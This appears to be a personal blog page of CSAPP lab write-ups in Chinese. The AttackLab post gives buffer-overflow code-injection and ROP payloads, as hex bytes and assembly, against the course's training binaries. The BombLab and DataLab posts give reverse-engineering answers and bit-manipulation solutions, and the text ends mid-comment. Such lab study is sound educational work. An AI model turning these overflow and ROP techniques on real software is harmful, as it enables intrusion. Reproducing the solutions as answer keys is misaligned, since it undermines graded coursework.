<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>lhr&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="lhr&#39;s blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="lhr&#39;s blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="lhr's blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">lhr&#39;s blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-CSAPP-AttackLab" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/03/03/CSAPP-AttackLab/" class="article-date">
  <time class="dt-published" datetime="2023-03-02T16:44:12.000Z" itemprop="datePublished">2023-03-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/03/03/CSAPP-AttackLab/">CSAPP:AttackLab</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="AttackLab"><a href="#AttackLab" class="headerlink" title="AttackLab"></a>AttackLab</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1.1"></a>1.1</h3><p>栈帧28Byte随便填, 将返回地址用函数 touch1() 的地址代替, 地址占8Byte</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 ./hex2raw &lt; exploit.txt &gt; exploit_raw.txt</span><br><span class="line">➜  target1 ./ctarget -qi exploit_raw.txt            </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 00 C0 17 40 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>很奇怪我只有用这种方式才行, 不然不管怎样都<code>Ouch!: You caused a segmentation fault</code>, 用gdb查看报错信息:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x00007ffff7c75150 in __vfprintf_internal (s=0x7ffff7e1a780 &lt;_IO_2_1_stdout_&gt;, format=0x4032b4 &quot;Type string:&quot;, ap=ap@entry=0x5561dbd8, mode_flags=mode_flags@entry=2) at ./stdio-common/vfprintf-internal.c:1244</span><br><span class="line">1244    ./stdio-common/vfprintf-internal.c: No such file or directory.</span><br></pre></td></tr></table></figure>
<h3 id="1-2"><a href="#1-2" class="headerlink" title="1.2"></a>1.2</h3><p>test -&gt; getbuf -&gt; Gets<br>call Gets时我们利用缓冲区溢出攻击, 在getbuf栈帧中的rsp填上想要执行的指令序列, 并将getbuf的返回地址替换为getbuf栈帧的rsp的值(<code>0x5561dc78</code>)以便getbuf ret后去执行我们的指令序列. 指令序列将cookie值传给%rdi,再去执行touch2<br>指令序列如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi</span><br><span class="line">pushq $0x4017ec #touch2的地址</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>getbuf中信息(我们可以直接用info r rsp查看rsp的值):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info frame</span><br><span class="line">Stack level 0, frame at 0x5561dca8:</span><br><span class="line"> rip = 0x4017af in getbuf (buf.c:14); saved rip = 0x401976(注:到test函数的返回地址)</span><br><span class="line"> called by frame at 0x5561dcb8</span><br><span class="line"> source language c.</span><br><span class="line"> Arglist at 0x5561dc70, args: </span><br><span class="line"> Locals at 0x5561dc70(getbuf的rsp), Previous frame&#x27;s sp is 0x5561dca8</span><br><span class="line"> Saved registers:</span><br><span class="line">  rip at 0x5561dca0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c exploit1-2.s</span><br><span class="line">objdump -d exploit1-2.o &gt; exploit1-2.d</span><br></pre></td></tr></table></figure>
<p>在exploit1-2.d中查看指令序列的十六进制编码, 将它和填充值、替代返回地址一起加入到exploit1-2.txt中:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59    /* mov    $0x59b997fa,%rdi */</span><br><span class="line">68 ec 17 40 00  /* push   $0x4017ec */</span><br><span class="line">c3  /* ret */</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<h3 id="1-3"><a href="#1-3" class="headerlink" title="1.3"></a>1.3</h3><p>需要传给touch3函数我们的字符串地址, 字符串可以存在test的rsp之上, 以免执行touch3的时, touch3的栈帧将我们的字符串冲掉<br>test栈帧rsp &#x3D; <code>0x5561dca8</code><br>cookie<code>59b997fa</code>字符串的ACII值(hex)为<code>35 39 62 39 39 37 66 61 00</code>, 起始地址为<code>0x5561dca8</code><br>exploit1-3.txt如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55    /* mov    $0x5561dca8,%rdi */</span><br><span class="line">68 fa 18 40 00  /* push   0x4018fa #address of touch3 function */</span><br><span class="line">c3  /* ret */</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61</span><br><span class="line">78 dc 61 55 00 00 00 00 /* address of &quot;code injection&quot; */</span><br><span class="line">35 39 62 39 39 37 66 61 /* hex value of string cookie */</span><br></pre></td></tr></table></figure>
<h3 id="2-1"><a href="#2-1" class="headerlink" title="2.1"></a>2.1</h3><p>找一个gadget，含有<code>5f(popq %rdi) c3(ret)</code>，我们将getbuf的返回地址设为含有该指令序列的起始地址, 并在上面填上我们希望pop进rdi的值(即cookie)和touch2函数的地址(pop指令执行完后ret)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">402b18:	41 5f                	pop    %r15</span><br><span class="line">402b1a:	c3                   	ret</span><br></pre></td></tr></table></figure>
<p>gadget中的地址：<code>402b19</code>（注：ROP的两个实验直接测试在输出时会因为某种原因segmentation fault，但实际上我通过gdb跟踪调试发现，正确调用了touch函数并且传的参数也都是正确的。也许是因为我使用了不在farm里的gadget，但影响不大，我暂时懒得改了）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">19 2b 40 00 00 00 00 00   /* address of instrution bytes in gadget */</span><br><span class="line">fa 97 b9 59 00 00 00 00   /* cookie */</span><br><span class="line">ec 17 40 00 00 00 00 00   /* address of touch2 function */</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="2-2"><a href="#2-2" class="headerlink" title="2.2"></a>2.2</h3><p>栈地址每次run时是随机的，我们的字符串存在test栈帧中，但是不能通过固定地址访问它。所有考虑rsp+变址。<br>上网查了一些实现，有和我不一样的，我比他少3个操作: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/xvic/p/15996206.html#part-2-return-oriented-programming">https://www.cnblogs.com/xvic/p/15996206.html#part-2-return-oriented-programming</a><br>寻找<code>48 89 e[0~7</code>的gadget将rsp移到一个寄存器， 找到<code>48 89 e0 movq %rsp,%rax</code>指令地址:<br><code>0x401a06</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>或者这个也行(90为nop)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:	c3                   	ret   </span><br></pre></td></tr></table></figure>
<p>寻找<code>48 89 c[0~7]</code>的gadget将rax移到rdi或rsi，找到<code>48 89 c7 movq %rax, %rdi</code>指令地址:<code>0x4019a2</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	ret  </span><br></pre></td></tr></table></figure>
<p>接下来只要让rsi存上一个数， 用<code>popq %rsi</code>来实现，找到<code>5e</code>的gadget。指令地址:<code>0x401383</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">401382:	41 5e                	pop    %r14</span><br><span class="line">401384:	c3                   	ret  </span><br></pre></td></tr></table></figure>
<p>这个返回地址的上面填上要pop给rsi的值：6 * 8 &#x3D; 48(0x30)<br>再利用farm里的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>再做一次<code>48 89 c7 movq %rax, %rdi</code>将参数传给rdi<br>最后是touch3函数的地址<br>和string of cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">61 61 61 61 61 61 61 61 61 61</span><br><span class="line">06 1a 40 00 00 00 00 00 /* movq %rsp,%rax   ret */</span><br><span class="line">a2 19 40 00 00 00 00 00 /* movq %rax,%rdi   ret */</span><br><span class="line">83 13 40 00 00 00 00 00 /* popq %rsi    ret */</span><br><span class="line">30 00 00 00 00 00 00 00 /* 48(0x30) */</span><br><span class="line">d6 19 40 00 00 00 00 00 /* lea  (%rdi,%rsi,1),%rax  ret */</span><br><span class="line">a2 19 40 00 00 00 00 00 /* movq %rax,%rdi   ret */</span><br><span class="line">fa 18 40 00 00 00 00 00 /* address of touch3 function */</span><br><span class="line">35 39 62 39 39 37 66 61 00  /* string of cookie */</span><br><span class="line"></span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/03/03/CSAPP-AttackLab/" data-id="clerc9f0m00005o2x52060egs" data-title="CSAPP:AttackLab" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CSAPP-BombLab" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/03/03/CSAPP-BombLab/" class="article-date">
  <time class="dt-published" datetime="2023-03-02T16:43:57.000Z" itemprop="datePublished">2023-03-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/03/03/CSAPP-BombLab/">CSAPP:BombLab</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="BombLab"><a href="#BombLab" class="headerlink" title="BombLab"></a>BombLab</h2><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h3><p>phase_1 -&gt; strings_not_equal<br>strings_not_equal是比较input_string和密码的函数, stepi进这个函数, 阅读汇编代码可知%rdi、%rsi分别存放着input_string和phase_1字符串的地址, 在这个函数里用<code>info registers</code>查看寄存器的值得到地址0x402400, 然后<code>print (char *) 0x402400</code>查看该处存的字符串<br><img src="https://raw.githubusercontent.com/lhr42/image/main/PicGo/Pasted%20image%2020230226171858.png" alt="Pasted image 20230226171858"></p>
<h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><p>phase_2 -&gt; read_six_numbers<br>read_six_numbers中call <code>sscanf</code>从input(%rdi)中以<code>0x4025c3</code>(%esi)处字符串的format读六个数(地址为: %rdx, %rcx, %r8, %r9, 以及栈帧参数构造区的两个参数).<br><img src="https://raw.githubusercontent.com/lhr42/image/main/PicGo/Pasted%20image%2020230226193710.png" alt="Pasted image 20230226193710"><br><img src="https://raw.githubusercontent.com/lhr42/image/main/PicGo/Pasted%20image%2020230226192609.png" alt="Pasted image 20230226192609"><br>阅读phase_2汇编代码即可发现第一个数为1, 后一个数是前一个数的2倍.</p>
<h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><p>同样得知sscanf读两个数到0x8(%rsp), 0xc(%rsp)中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print (char *) 0x4025cf</span><br><span class="line">$2 = 0x4025cf &quot;%d %d&quot;</span><br></pre></td></tr></table></figure>
<p><code>400f75:	ff 24 c5 70 24 40 00 	jmp    *0x402470(,%rax,8)</code>这句根据%rax即第一个数不同jmp到不同的位置, 第一个数要 &gt; 7, 填好第一个数后, 在这里用stepi查看会jmp到哪里, 然后判断第二个应该等于多少</p>
<h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h3><p>同样是读两个数, 第一个数需要&lt;&#x3D;0xe, 第二个数必须是0, func返回值需要等于0. 第一次调用func时, %ecx &#x3D; 7 与 第一个数比较, 如果相等的话可以直接返回0, 所以我们可以将第一个数赋值为7直接过掉</p>
<h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><p>首先我们输入的字符串长度必须等于6<br><code>mov    $0x40245e,%esi</code> 查看0x40245e处存储的字符串得到 “flyers”<br>我们输入的字符串经过<code>movzbl 0x4024b0(%rdx),%edx</code>这一步改变后需要和“flyers”相等. 查看0x4024b0处的字符串:<code>0x4024b0 &lt;array&gt; &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</code>, 我们输入的字符串的每个字符的低四位作为基址, 在“maduiersnfotvbyl”中找到对应的字符映射成“flyers”, 所以各字符的低四位分别为:0x9, f, e, 5, 6, 7. 高四位随便选择即可, 例如都加上0x60(i, o, n, e, f, g)或0x40</p>
<h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><p>汇编代码有点长，<br><img src="https://raw.githubusercontent.com/lhr42/image/main/PicGo/20230303002809.png" alt="image.png"></p>
<p><img src="https://raw.githubusercontent.com/lhr42/image/main/PicGo/Pasted%20image%2020230227123753.png" alt="Pasted image 20230227123753"><br>重排之后按value的低四位大小排序应该: node3 &gt; node4 &gt; node5 &gt; node6 &gt; node1 &gt; node2<br>故 7 - xi 之后应该为3, 4, 5, 6, 1, 2</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/03/03/CSAPP-BombLab/" data-id="clerc9f0o00015o2x2lrzc21c" data-title="CSAPP:BombLab" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CSAPP-DataLab" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/03/03/CSAPP-DataLab/" class="article-date">
  <time class="dt-published" datetime="2023-03-02T16:41:01.000Z" itemprop="datePublished">2023-03-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/03/03/CSAPP-DataLab/">CSAPP:DataLab</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(((~(x &amp; (~y)))) &amp; (~((~x) &amp; y)));<span class="comment">//异或: 与或式 二次取反 转化为 与非式 (逻辑函数表达式的转换)</span></span><br><span class="line">  <span class="comment">//结果也可以使用“非”和“与”计算不是同时为0情况和不是同时为1的情况进行位与，即~(~x&amp;~y)&amp;~(x&amp;y)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">tmin</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">isTmax</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//将 x 加1的值再和 x 相加，得到了全1，然后取反得到全0，因为补码-1也有这个特点，所以要排除</span></span><br><span class="line">  <span class="type">int</span> a = x + <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> b = a + x;</span><br><span class="line">  b += !a;<span class="comment">//排除x = -1(x + 1 为 全0)的情况,</span></span><br><span class="line">  <span class="keyword">return</span> !~b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">allOddBits</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> mask = <span class="number">0xAA</span> + (<span class="number">0xAA</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  mask = mask + (mask &lt;&lt; <span class="number">16</span>);</span><br><span class="line">  <span class="comment">//掩码中的1保留x的特征, 0掩盖x的特征. x &amp; 掩码 之后必须与mask相同</span></span><br><span class="line">  <span class="keyword">return</span> !(mask ^ (mask &amp; x));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">negate</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//-x的补码实际上就是带符号位取反 + 1</span></span><br><span class="line">  <span class="comment">//因为 x + 